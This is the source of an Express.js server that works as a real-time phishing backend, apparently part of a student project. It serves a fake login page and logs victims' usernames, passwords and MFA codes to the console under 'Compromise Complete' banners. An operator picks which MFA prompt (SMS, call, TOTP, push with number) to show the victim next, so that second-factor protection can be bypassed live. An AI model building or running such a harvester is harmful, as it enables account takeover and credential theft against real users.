const express = require("express")
const app = express();
const bodyParser = require("body-parser")
const readline = require('readline');

app.use(express.static("public"));
app.use(bodyParser.json());

const hostname = '127.0.0.1';
const port = 3010;

var accounts = []

// https://expressjs.com/en/starter/basic-routing.html
app.get("/", (request, response) => {
  response.sendFile(__dirname + "/views/login.html");
});

/*
Login Handler
*/
app.post("/submit", async (req, res) => {
  var username = req.body.username;
  var password = req.body.password;
  var mfa = req.body.mfa;

  console.log("Received input...");

  // check if account exists
  var found = false;
  var foundIndex = 0;
  for (index = 0; index < accounts.length && found === false; index++) {
    if(accounts[index].username === username) {
      found = true;
      foundIndex = index;
    }
  }
  // update accounts according to "found"
  if (found) {
    console.log("Found existing account... updating entry...");
    accounts[foundIndex].password = password;
    accounts[foundIndex].mfa = mfa;
    // check if all fields set and print out if true
  }
  else {
    console.log("Creating new account entry...");
    var newAccount = {
      username: username,
      password: password,
      mfa: mfa
    }
    accounts.push(newAccount)
  }

  // set up mfa style and translation dict
  var mfa_code = 0;
  // only relevant to code 6 (mfa with push)
  var mfa_num1 = 0; var mfa_num2 = 0; var mfa_num3 = 0;
  var mfa_translation = {
    0: "Invalid Account",
    1: "SMS", // covers all types of typed in passwords (TOTP/SMS/Call/Email)
    2: "Call",
    3: "Email",
    4: "TOTP",
    5: "Push Notification", // covers both push types
    6: "Push w/ Code",
    7: "Solution"
   }

   // handle request accordingly
   if(mfa !== "") {
     console.log("-----------------------MFA Found--------------------------")
     console.log("Username: ".concat(username))
     console.log("MFA: ".concat(mfa))
     console.log("\nUser redirected!")
     console.log("------------------Compromise Complete---------------------\n")

     const response = {
       status: 200
     }
     res.json(response)
   }
   else if(username !== "" && password !== "") {
    // now handle printing and waiting on admin to provide MFA type
    console.log("---------------------Account Found-----------------------")
    var printout = "Username: ".concat(username)
    printout = printout.concat("\nPassword: ").concat(password)
    console.log(printout)
    console.log("---------------------")
    mfa_code = await waitOnMFA()
    console.log("---------------------")
    // special handling for mfa w/ push
    if(mfa_code == 6) {
      mfa_num1 = await waitOnPushCode(1)
      console.log("---------------------")
    }
    printout = "Displaying  ".concat(mfa_translation[mfa_code])
    printout = printout.concat(" to user...")
    console.log(printout)
    console.log("-------------------Awaiting MFA Code----------------------\n")

    // respond once admin has provided mfa code
    const response = {
      status: 200,
      mfa: parseInt(mfa_code),
      num1: mfa_num1
    }
    res.json(response)
  }
  else {
    // otherwise respond without code (not ready for MQP step)
    const response = {
      status: 200
    }
    res.json(response)
  }
});

app.post("/push", async (req, res) => {
  console.log("--------------Press a Key When Push Complete--------------")
  await waitOnPush()
  const response = {
    status: 200
  }
  res.json(response)
  console.log("------------------Compromise Complete---------------------\n")
});

function waitOnMFA() {
  // prompt user for code and return promise
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  const query = "MFA Styles Available\n  0: Invalid Account\n  1: SMS\n  2: Call\n  3: Email\n  4: TOTP\n  5: Push Notification\n  6: Push w/ code\n  7: Solution Test\nWhat MFA does the user have? "
  return new Promise(resolve => rl.question(query, ans => {
    rl.close();
    resolve(ans);
  }))

  return code;
}

function waitOnPushCode(num) {
  // prompt user for code and return promise
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  const query = "What is number (" + num + ")?  "
  return new Promise(resolve => rl.question(query, ans => {
    rl.close();
    resolve(ans);
  }))

  return code;
}

function waitOnPush() {
  // prompt user for code and return promise
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  const query = "..."
  return new Promise(resolve => rl.question(query, ans => {
    rl.close();
    resolve(ans);
  }))

  return code;
}

process.on('SIGTERM', () => {
  server.close(() => {
    console.log('Process terminated')
  })
})

// listen for requests
const listener = app.listen(port, () => {
  console.log("Your app is listening on port " + listener.address().port);
  console.log("Exit gracefully with CTRL-C...\n")
});
